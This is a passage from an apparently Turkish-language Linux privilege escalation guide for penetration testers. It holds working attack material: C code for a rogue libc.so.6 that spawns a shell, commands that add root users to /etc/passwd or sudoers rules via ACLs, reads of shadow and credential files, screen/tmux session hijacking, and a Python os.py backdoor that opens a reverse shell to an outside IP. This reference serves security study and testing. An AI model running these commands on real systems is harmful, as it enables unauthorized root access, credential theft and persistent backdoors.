Ardından, `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` komutunu kullanarak `/var/tmp` içinde kötü amaçlı bir kütüphane oluşturun.

```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
 char *file = SHELL;
 char *argv[] = {SHELL,0};
 setresuid(geteuid(),geteuid(), geteuid());
 execve(file,argv,0);
}
```

## Capabilities

Linux capabilities, bir sürece kullanılabilir root ayrıcalıklarının **bir alt kümesini sağlar**. Böylece root **ayrıcalıkları daha küçük ve birbirinden ayrı birimlere bölünür**. Bu birimlerin her biri süreçlere bağımsız olarak verilebilir. Bu sayede ayrıcalıkların tamamı azaltılır ve exploitation riskleri düşürülür.\
Capabilities ve bunların nasıl kötüye kullanılabileceği hakkında **daha fazla bilgi edinmek** için aşağıdaki sayfayı okuyun:


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Dizin izinleri

Bir dizinde **"execute" biti**, ilgili kullanıcının klasöre "**cd**" komutuyla girebileceğini belirtir.\
**"Read" biti**, kullanıcının **dosyaları** listeleyebileceğini; **"write" biti** ise **dosyaları** silebileceğini ve yenilerini oluşturabileceğini belirtir.

## ACLs

Access Control Lists (ACLs), geleneksel ugo/rwx izinlerini **geçersiz kılabilen** ikincil bir isteğe bağlı izin katmanıdır. Bu izinler, sahibi olmayan veya grubun parçası olmayan belirli kullanıcılara haklar vererek ya da bu hakları reddederek dosya veya dizin erişimi üzerindeki denetimi artırır. Bu **ayrıntı düzeyi, erişimin daha hassas biçimde yönetilmesini sağlar**. Daha fazla ayrıntıyı [**burada**](https://linuxconfig.org/how-to-manage-acls-on-linux) bulabilirsiniz.<sup>[[19]](#references)</sup>

Bir kullanıcıya, "kali"ye, bir dosya üzerinde okuma ve yazma izinleri **verin**:

```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```

Sistemden belirli ACL'lere sahip dosyaları **alın**:

```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```

### sudoers drop-in'lerinde gizli ACL arka kapısı

Yaygın bir yanlış yapılandırma, `/etc/sudoers.d/` içinde root tarafından sahiplenilmiş ve `440` izinlerine sahip bir dosyanın ACL aracılığıyla düşük yetkili bir kullanıcıya hâlâ yazma erişimi vermesidir.

```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```

`user:alice:rw-` gibi bir şey görürseniz, kısıtlayıcı izin bitlerine rağmen kullanıcı bir sudo kuralı ekleyebilir:

```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```

Bu, yüksek etkili bir ACL persistence/privesc yoludur; çünkü yalnızca `ls -l` çıktısına dayalı incelemelerde kolayca gözden kaçabilir.

## Açık shell oturumları

Kullanıcılar arası GNU Screen erişimi yalnızca sürüme değil, **çalışan oturumun yapılandırmasına ve ACL'sine** bağlıdır. [GNU Screen belgelerine göre](https://www.gnu.org/software/screen/manual/html_node/Multiuser-Session.html), multiuser desteğiyle derlenmiş olmalıdır; `multiuser on` ve bir `acladd` veya uygun bir `aclchg` izni, başka bir kullanıcının oturuma bağlanmasına olanak tanır. [Kılavuz, kullanıcılar arası oturum araması için setuid-root da gerektirir](https://www.gnu.org/software/screen/manual/html_node/Invoking-Screen.html). Görünür, root'a ait bir socket veya tek başına bir SUID `screen` binary'si, bağlanılabilir bir root shell'in varlığını kanıtlamaz. Bunu privilege escalation olarak değerlendirmeden önce canlı oturumun multiuser olduğunu, mevcut kullanıcının etkili input/command iznine sahip olduğunu ve oturumdaki shell'in ayrıcalıklı sahibin yetkileriyle çalıştığını doğrulayın.

### screen sessions hijacking

**Screen oturumlarını listeleme**

```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```

![screen oturumlarının ele geçirilmesi - Socket konumları (bazı sistemlerde biri diğerinin sembolik bağlantısı olarak sunulur): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**Bir oturuma bağlanın**

```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```

## tmux oturumlarını hijack etme

Bu, **eski tmux sürümlerinde** görülen bir sorundu. Ayrıcalıksız bir kullanıcı olarak root tarafından oluşturulmuş bir tmux (v2.1) oturumunu hijack edemedim.

**tmux oturumlarını listeleme**

```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```

![Socket konumları (bazı sistemlerde biri diğerinin sembolik bağlantısı olarak sunulur) - tmux oturumlarını ele geçirme: tmux -S /tmp/dev sess ls Bu socket'i kullanarak listeleyin; bu socket'te bir tmux oturumu başlatabilirsiniz...](<../../images/image (837).png>)

**Bir oturuma bağlan**

```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```

Check **HTB'den Valentine box** bölümüne bir örnek için bakın.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Etkilenen Debian veya türevi OpenSSL sürümleriyle tarihsel güvenlik açığı döneminde oluşturulan anahtarların rastgeleliği tahmin edilebilir olabilir; makinenin mevcut dağıtımı veya yamalı OpenSSL sürümü, eski bir anahtarın nasıl oluşturulduğunu göstermez. **Belirli anahtarı** uygun bir tarihsel blacklist ve kaynağıyla karşılaştırarak kontrol edin. Debian'ın [`ssh-vulnkey` kılavuzu](https://manpages.debian.org/wheezy/openssh-client/ssh-vulnkey.1.en.html) public key'lerin ve `authorized_keys` dosyalarının kontrolünü açıklar; [DSA-1571-1](https://security-tracker.debian.org/tracker/DSA-1571-1) ise OpenSSL düzeltmesini kaydeder. Ayrıcalıklı bir hesabın `authorized_keys` dosyasındaki bir girdi, yalnızca eşleşen private key kurtarılabiliyorsa ve etkin SSH ilkesi bu hesabın söz konusu anahtarı kullanmasını hâlâ kabul ediyorsa ayrıcalık yükseltme için bir ipucudur; zayıf bir **host** anahtarı tek başına giriş kimlik bilgisi değildir. Ele geçirilmiş anahtarları değiştirin ve bunlara ait eski yetkilendirmeleri kaldırın.

### SSH İlginç yapılandırma değerleri

- **PasswordAuthentication:** Parola kimlik doğrulamasına izin verilip verilmediğini belirtir. Upstream OpenSSH varsayılanı `yes` değeridir; dağıtım yapılandırması bunu geçersiz kılabilir.
- **PubkeyAuthentication:** Public key kimlik doğrulamasına izin verilip verilmediğini belirtir. Varsayılanı `yes` değeridir.
- **PermitEmptyPasswords**: Parola kimlik doğrulamasına izin verildiğinde, sunucunun boş parola dizelerine sahip hesaplarla girişe izin verip vermediğini belirtir. Varsayılanı `no` değeridir.

### Giriş denetimi dosyaları

Bu dosyalar, kimlerin ve nasıl giriş yapabileceğini etkiler:

- **`/etc/nologin`**: mevcutsa root dışındaki kullanıcıların girişini engeller ve içindeki mesajı gösterir.
- **`/etc/securetty`**: root'un nerelerden giriş yapabileceğini sınırlar (TTY izin listesi).
- **`/etc/motd`**: giriş sonrası gösterilen banner (ortam veya bakım ayrıntılarını leak edebilir).

### PermitRootLogin

Root'un ssh kullanarak giriş yapıp yapamayacağını belirtir. Upstream OpenSSH varsayılanı `prohibit-password` değeridir; dağıtım yapılandırması bunu geçersiz kılabilir. Olası değerler:

- `yes`: root parola ve private key kullanarak giriş yapabilir
- `without-password` veya `prohibit-password`: root yalnızca private key ile giriş yapabilir
- `forced-commands-only`: Root yalnızca private key kullanarak ve komut seçenekleri belirtilmişse giriş yapabilir
- `no` : hayır

### Güvenilen SSH kullanıcı sertifikası yetkilileri

`TrustedUserCAKeys`, sshd'nin **kullanıcı** sertifikalarını imzalamak için güvendiği public key'leri belirtir. İlgili private CA key'i daha düşük ayrıcalıklı bir kullanıcı tarafından okunabiliyorsa, kimlerin sertifika alabileceğini ve bu sertifikaların hangi hesap kimlikleriyle doğrulanabileceğini inceleyin. `AuthorizedPrincipalsFile` veya `AuthorizedPrincipalsCommand` kabul edilen adları kısıtlayabilir; ikisi de yapılandırılmamışsa sertifika, hedef hesabın adını içermelidir. `PermitRootLogin prohibit-password`, root parola kimlik doğrulamasını engeller ancak sertifika kimlik doğrulamasına yine de izin verebilir. Bir anahtar yolunun açığa çıkması tek başına erişimi kanıtlamaz: public/private key çiftini, etkin `Match` kurallarını, hesap ilkesini, key parolasını, iptal durumunu ve kabul edilen imza algoritmalarını doğrulayın. Private key içeriğini keşif çıktısına eklemeyin. [OpenSSH sunucu yapılandırma kılavuzuna](https://man.openbsd.org/sshd_config#TrustedUserCAKeys) bakın.

Bir private CA key, ayrıcalık devri kuralı mevcut kullanıcıya anahtar okunamasa bile kullanılabilir olabilir; örneğin bu kural, kullanıcının anahtar sahibinin kimliğiyle kısıtlamasız bir [sertifika imzalayıcıyı (örneğin `ssh-keygen -s`)](https://man.openbsd.org/ssh-keygen#-s) çalıştırmasına izin veriyorsa. İzin verilen tam komut ve argümanları; imzalayıcı hesabının anahtara erişimi, etkin sshd yapılandırmasının güvendiği public CA, hedef hesap için kabul edilen principal, sertifika geçerliliği ve hesabın giriş ilkesiyle birlikte değerlendirin. Devredilmiş bir imzalayıcı komutu veya güvenilen bir CA dosyası tek başına başka bir hesaba erişimi kanıtlamaz; pasif keşif sırasında deneme sertifikası imzalamayın.

### AuthorizedKeysFile

Kullanıcı kimlik doğrulamasında kullanılabilecek public key'leri içeren dosyaları belirtir. Ana dizinle değiştirilen `%h` gibi belirteçler içerebilir. **Mutlak yollar** ( `/` ile başlayan) veya **kullanıcının ana dizinine göreli yollar** belirtebilirsiniz. Örneğin:

```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```

Bu yapılandırma, "**testusername**" kullanıcısının **private** key’iyle login olmaya çalışırsanız ssh’in key’inizin public key’ini `/home/testusername/.ssh/authorized_keys` ve `/home/testusername/access` konumlarında bulunanlarla karşılaştıracağını belirtir.

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding, sunucunuzda passphrase’siz key’ler bırakmak yerine **yerel SSH key’lerinizi kullanmanızı** sağlar. Böylece ssh üzerinden bir **host’a jump** yapabilir ve oradan **ilk host’unuzda** bulunan **key’i kullanarak** **başka bir host’a jump** yapabilirsiniz.

Bu seçeneği `$HOME/.ssh.config` içinde aşağıdaki gibi ayarlamanız gerekir:

```
Host example.com
  ForwardAgent yes
```

`Host` her seferinde kullanıcı farklı bir makineye geçtiğinde `*` ise, o makine anahtarlara erişebilir (bu bir güvenlik sorunudur).

`/etc/ssh_config` dosyası bu seçenekleri **geçersiz kılabilir** ve bu yapılandırmaya izin verebilir veya vermeyebilir.\
`/etc/sshd_config` dosyası `AllowAgentForwarding` anahtar sözcüğüyle ssh-agent forwarding'e **izin verebilir** veya vermeyebilir (varsayılan olarak izin verilir).

Bir ortamda Forward Agent yapılandırıldığını fark ederseniz, aşağıdaki sayfayı okuyun; **ayrıcalıkları yükseltmek için bundan yararlanabilirsiniz**:


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## İlginç Dosyalar

### Profil dosyaları

`/etc/profile` dosyası ve `/etc/profile.d/` altındaki dosyalar, **kullanıcı yeni bir shell başlattığında çalıştırılan betiklerdir**. Bu nedenle, bunlardan herhangi birine **yazabilir veya bunları değiştirebilirseniz ayrıcalıklarınızı yükseltebilirsiniz**.

```bash
ls -l /etc/profile /etc/profile.d/
```

Herhangi bir şüpheli profil betiği bulunursa **hassas bilgileri** kontrol etmelisiniz.

### Passwd/Shadow Dosyaları

İşletim sistemine bağlı olarak `/etc/passwd` ve `/etc/shadow` dosyaları farklı adlar kullanıyor olabilir veya yedekleri bulunabilir. Bu nedenle, dosyaların **tümünü bulmanız** ve **okuyup okuyamadığınızı kontrol etmeniz**, dosyaların içinde **hash olup olmadığını** görmeniz önerilir:

```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```

Bazı durumlarda `/etc/passwd` (veya eşdeğeri) dosyasında **parola hash'leri** bulabilirsiniz.

```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```

### Yazılabilir /etc/passwd

İlk olarak, aşağıdaki komutlardan biriyle bir parola oluşturun.

```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```

Ardından hacker kullanıcısını ekleyin ve oluşturulan parolayı ekleyin.

```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```

Örn: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Artık `hacker:hacker` bilgileriyle `su` komutunu kullanabilirsiniz.

Alternatif olarak, parola olmadan sahte bir kullanıcı eklemek için aşağıdaki satırları kullanabilirsiniz.\
UYARI: makinenin mevcut güvenliğini zayıflatabilirsiniz.

```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```

NOT: BSD platformlarında `/etc/passwd`, `/etc/pwd.db` ve `/etc/master.passwd` konumlarında bulunur; ayrıca `/etc/shadow`, `/etc/spwd.db` olarak yeniden adlandırılır.

Bazı **hassas dosyalara yazıp yazamayacağınızı** kontrol etmelisiniz. Örneğin, herhangi bir **hizmet yapılandırma dosyasına** yazabilir misiniz?

```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```

Örneğin, makine bir **tomcat** sunucusu çalıştırıyorsa ve **/etc/systemd/ içindeki Tomcat hizmeti yapılandırma dosyasını değiştirebiliyorsanız,** şu satırları değiştirebilirsiniz:

```
ExecStart=/path/to/backdoor
User=root
Group=root
```

Backdoor'unuz, tomcat bir sonraki başlatıldığında çalıştırılacaktır.

### Dizinleri Kontrol Et

Aşağıdaki dizinlerde yedekler veya ilginç bilgiler bulunabilir: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Muhtemelen sonuncusunu okuyamayacaksınız ama yine de deneyin)

```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```

### Tuhaf Konum/Sahipli Dosyalar

```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
      do printf "  Group $g:\n";
      find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
      done
done
```

### Son dakikalarda değiştirilen dosyalar

```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```

### Sqlite DB dosyaları

```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```

Okunabilir uygulama veritabanlarında kullanıcı adları ve parola hash'leri için tablo ve sütun adlarını inceleyin. Bir hash bulmak, parolasını kurtarmak ve parolanın yerel bir hesapta yeniden kullanıldığını kanıtlamak ayrı adımlardır; genel biçimli 32 karakterlik onaltılık bir dize, bunun MD5 olduğunu veya hesaba erişim sağladığını çıkarsamak için yeterli değildir.

### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml dosyaları

```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```

Okunabilir bir shell geçmişinde `sudo` komutunun ardından kısa, şifre benzeri bir satır varsa çevresindeki satırları elle inceleyin. Normal `sudo` istemine girilen bir parola shell geçmişine kaydedilmez; sonraki satır yalnızca yanlışlıkla shell'e girilmiş olabilecek bir girdidir, geçerli bir parolanın kanıtı değildir. `.sudo_as_admin_successful` işaretçisi mevcut yetkilendirmeyi değil, daha önce kullanım olduğunu kaydeder.

### Gizli dosyalar

```bash
find / -type f -iname ".*" -ls 2>/dev/null
```

### **PATH'teki Script/Binaries**

```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```

### **Web dosyaları**

```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```

### **Yedekler**

Yedekleme dizinlerindeki okunabilir dosyaları ve **adlarında** `backup` geçen dosyaları inceleyin: adı anlaşılmaz olan veya uzantısı şifreli olduğunu gösteren bir arşiv bile eski uygulama verilerini açığa çıkarabilir. Şifrelenmiş bir arşiv yalnızca olası bir veri açığa çıkma kaynağıdır. Parola kurtarma, içeriği inceleme, bir uygulama hash'ini kurtarma ve bu parolayı bir Unix hesabında yeniden kullanma, doğrulanması gereken ayrı adımlardır; arşivdeki bir hash, yerel oturum açmanın mümkün olduğunu kanıtlamaz.

Okunabilir sanal makine yedekleri de aynı şekilde incelenmelidir. Bir VirtualBox `.vbox` yapılandırması, bağlı `.vdi` imajlarını belirleyebilir ve şifrelenmiş disk anahtarı meta verilerini içerebilir; [VirtualBox, şifrelenmiş veri anahtarının VM yapılandırmasında saklandığını belgeliyor](https://docs.oracle.com/en/virtualization/virtualbox/7.0/user/AdvancedTopics.html). Çevrimdışı disk incelemesi yapılabilmesi için hem yapılandırmaya hem de imaja erişilebilmesi gerekir. Konuk biriminde ayrıca ayrı bir anahtar gerektiren [LUKS şifreleme katmanı](https://gitlab.com/cryptsetup/cryptsetup/-/blob/main/man/cryptsetup.8.adoc) bulunabilir. Yetkili şifre çözme işleminden sonra bile eski betikler veya yapılandırmalar parola içerebilir; bunu yerel bir ana hesap için güncel kimlik bilgisi olarak kabul etmeden ve etkin `sudo` politikasının ayrıcalıklı bir komuta izin verdiğini doğrulamadan önce teyit edin. Pasif sayım sırasında imajları kopyalamadan, şifrelerini çözmeden veya bağlamadan yolları ve izinleri envanterleyin.

Okunabilir bir arşivi incelerken herhangi bir şeyi çıkarmadan önce üye adlarını listeleyin: canlı kopyalar korumalı olsa bile gizli kimlik doğrulayıcı dosyalar, kurtarma kodu verileri veya SSH anahtarları bulunabilir. Dosya adları yalnızca bir ipucudur; içeriği ve olası hesap yeniden kullanımını ayrıca doğrulayın.

Yedekleme dizinlerinde **başka bir kullanıcıya ait okunabilir arşivlere**, özellikle root sahipliğindeki arşivlere ve grup üyeliği aracılığıyla erişilebilenlere öncelik verin. Canlı kopya korumalı olsa bile eski bir arşiv yapılandırma veya kimlik doğrulama sırrı içerebilir. [Backrest](https://garethgeorge.github.io/backrest/) gibi yerel bir yedekleme arayüzünde, hizmetin etkin hesabını ve daha düşük ayrıcalıklı bir kullanıcının yapılandırmasını okuyup okuyamadığını veya arayüze kimlik doğrulaması yapıp yapamadığını kontrol edin. [Hooks](https://garethgeorge.github.io/backrest/docs/hooks) ve [restic komut arayüzü](https://github.com/garethgeorge/backrest/blob/main/proto/v1/service.proto), daemon'ın dosya ve komut ayrıcalıklarıyla çalışabilir; yalnızca loopback üzerinde dinlemesi etkiyi belirlemez. Backrest'in `passwordBcrypt` değeri, [kimlik doğrulama kodunda](https://github.com/garethgeorge/backrest/blob/main/internal/auth/auth.go) bulunan base64 kodlamalı bir bcrypt hash'idir; düz metin parola değildir. Açığa çıkmış bir arşivi veya arayüzü ayrıcalık sınırı olarak değerlendirmeden önce hizmet kimliğini, kullanılabilir kimlik bilgilerini ve ilgili plana veya depoya erişimi doğrulayın.

```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```

### Parola içerebilen bilinen dosyalar

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) kodunu inceleyin; **parola içerebilecek çeşitli dosyaları** arar.\
Bunu yapmak için kullanabileceğiniz **bir başka ilginç araç** da Windows, Linux ve Mac için yerel bilgisayarda kayıtlı pek çok parolayı almak üzere kullanılan açık kaynaklı bir uygulama olan [**LaZagne**](https://github.com/AlessandroZ/LaZagne).

`/etc/guacamole/guacamole.properties` okunabiliyorsa, `mysql-*`, `postgresql-*` veya `sqlserver-*` veritabanı bağlantı ayarlarını inceleyin. Hesabın Guacamole JDBC tablolarını okuma yetkisi varsa, `guacamole_connection_parameter` kayıtlı SSH `username`, `password`, `private-key` veya `passphrase` değerlerini içerebilir. Önce bağlantı kimliklerini ve parametre adlarını listeleyin, ardından yalnızca ilgili satırları inceleyin; kayıtlı bir değer, yeniden kullanılabilir bir sır yerine dinamik bir token veya vault referansı olabilir. [Guacamole JDBC şemasına](https://guacamole.apache.org/doc/gug/jdbc-auth-schema.html) ve [SSH bağlantı parametrelerine](https://guacamole.apache.org/doc/gug/configuring-guacamole.html) bakın.

[pswm parola yöneticisi](https://github.com/Julynx/pswm#usage), varsayılan olarak şifrelenmiş bir kasayı `~/.local/share/pswm/pswm` konumunda saklar. Başka bir kullanıcının kasası görünüyorsa sahipliğini ve hesabınızın kasayı gerçekten okuyup okuyamadığını kontrol edin. Kasanın dosya yolu tek başına kimlik bilgilerini açığa çıkarmaz; ana parolasını kurtarmak, yeniden kullanılabilir bir hesap parolası bulmak ve bu hesabın ayrıcalıklarını doğrulamak birbirinden ayrı adımlardır.

[Passpie'nin varsayılan veritabanı](https://passpie.readthedocs.io/en/latest/faq.html#what-is-a-passpie-database), grup dizinlerinde `.keys` anahtarlığı ve şifrelenmiş `.pass` kimlik bilgisi dosyaları bulunan `~/.passpie/` konumudur. Görülebilen bir veritabanı dizini yalnızca olası bir dosya yolu ipucudur: anahtara ve ilgili şifrelenmiş kayda erişimi, gerekebilecek ana parola ifadesini ve kurtarılan kimlik bilgisinin daha fazla ayrıcalığa sahip bir hesaba ait olup olmadığını doğrulayın. Passpie ayrıca [özel veritabanı yollarını](https://passpie.readthedocs.io/en/latest/getting_started.html#multiple-databases) da destekler; dolayısıyla varsayılan yol tüm olasılıkları kapsamaz. Otomatik listeleme, kimlik bilgilerini dışa aktarmadan veya anahtar materyalini yazdırmadan meta verileri listelemelidir.

### Loglar

Logları okuyabiliyorsanız, içlerinde **ilginç/gizli bilgiler** bulabilirsiniz. Log ne kadar tuhafsa o kadar ilginç olacaktır (muhtemelen).\
Ayrıca, bazı yanlış yapılandırılmış ("backdoor" eklenmiş?) "**kötü**" **audit logları**, bu yazıda açıklandığı gibi **parolaları audit loglarına kaydetmenize** olanak tanıyabilir: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).<sup>[[36]](#references)</sup>

```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```

Logları okumak için [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) grubu gerçekten faydalı olacaktır.

### Shell dosyaları

```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```

### Genel Kimlik Bilgisi Arama/Regex

Ayrıca adında veya içeriğinde "**password**" kelimesi geçen dosyaları aramalı; loglarda IP adreslerini ve e-posta adreslerini ya da hash regex'lerini de kontrol etmelisiniz.\
Bunların hepsini burada nasıl yapacağınızı anlatmayacağım, ancak ilgileniyorsanız [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) tarafından gerçekleştirilen son kontrolleri inceleyebilirsiniz.

## Yazılabilir dosyalar

### Python library hijacking

Bir python script'inin **nereden** çalıştırılacağını biliyorsanız ve o klasöre **yazabiliyorsanız** veya python kütüphanelerini **değiştirebiliyorsanız**, OS kütüphanesini değiştirip arka kapı ekleyebilirsiniz (python script'inin çalıştırılacağı yere yazabiliyorsanız os.py kütüphanesini kopyalayıp yapıştırın).

**Kütüphaneye arka kapı eklemek** için os.py kütüphanesinin sonuna şu satırı eklemeniz yeterlidir (IP ve PORT'u değiştirin):

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

### Logrotate istismarı

Ayrıcalıklı bir `logrotate` işi, yalnızca düşük ayrıcalıklı bir kullanıcının döndürme sırasında değiştirebildiği veya yönlendirebildiği bir dizinin altındaki logu gerçekten döndürdüğünde kullanıcılar arası dosya yazma yolu oluşturabilir. Tek başına yazılabilir bir log, yalnızca bir inceleme ipucudur. Etkin kuralı ve `create`, `olddir` ve `su` yönergelerini; zamanlayıcının etkin kimliğini; logun üst dizinindeki yazma ve arama izinlerini; ayrıca kurulu derlemenin ve politikanın hedef değişikliğine izin verip vermediğini doğrulayın. Başlangıç dosyasına yazmanın komut çalıştırmaya dönüşmesi için, daha sonra ayrıcalıklı bir kabuğun ortaya çıkan dosyayı yüklemesi de gerekir. Döndürmeyi tetiklemeden veya yarışı denemeden zamanlamayı, kuralı, sürümü/paketlemeyi ve yol meta verilerini inceleyin.

> [!TIP]
> `3.18.0` sürümünü veya herhangi bir sürüm dizesini tek başına istismar edilebilirlik sınırı olarak değerlendirmeyin. [Upstream değişiklik günlüğünde](https://github.com/logrotate/logrotate/blob/main/ChangeLog.md) birden fazla sürümde dizin ve symlink güvenliğinin güçlendirildiği kayıtlıdır; dağıtımlar düzeltmeleri geriye dönük olarak da uygulayabilir. [Upstream kılavuzu](https://github.com/logrotate/logrotate/blob/main/logrotate.8.in), root ayrıcalıklarıyla döndürülen loglar ayrıcalıksız kullanıcıların kontrolündeki dizinlerdeyse `su` kullanılmasını önerir; etkin kuralı ve gerçek davranışı doğrulayın.

Güvenlik açığıyla ilgili daha ayrıntılı bilgi şu sayfada bulunabilir: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).<sup>[[37]](#references)</sup>

Bu güvenlik açığını [**logrotten**](https://github.com/whotwagner/logrotten) ile istismar edebilirsiniz.

Bu güvenlik açığı [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logları)** ile çok benzerdir; bu nedenle logları değiştirebildiğinizi fark ederseniz bu logları kimin yönettiğini ve logları symlink'lerle değiştirerek ayrıcalıkları yükseltip yükseltemeyeceğinizi kontrol edin.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Güvenlik açığı referansı:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f).<sup>[[20]](#references)</sup>

